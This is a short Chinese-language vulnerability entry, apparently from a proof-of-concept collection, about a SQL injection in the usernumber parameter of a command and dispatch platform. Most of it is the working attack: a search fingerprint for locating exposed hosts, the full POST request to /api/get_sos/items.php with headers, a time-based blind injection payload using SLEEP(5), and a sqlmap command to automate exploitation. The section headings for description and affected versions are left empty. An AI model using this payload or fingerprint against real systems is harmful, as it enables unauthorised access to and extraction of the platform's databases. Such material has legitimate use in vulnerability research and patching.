# 指挥调度平台usernumber存在SQL注入漏洞

- **系统**：指挥调度平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /api/get_sos/items.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: PHPSESSID=4c1e6025b94bac25c4ec63e4affec7cd; authcode=3hqs`　`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 74`

**请求体 / payload**
```
sign=7a6f931dde8e8aafbbfa4d2bcab475e6&timestamp=1686020152221&usernumber=1' AND (SELECT 5464 FROM (SELECT(SLEEP(5)))FZxX) AND 'khLM'='khLM

sqlmap
sqlmap -r 2.txt --batch -p usernumber
```

**其他**
- 指挥调度平台usernumber存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台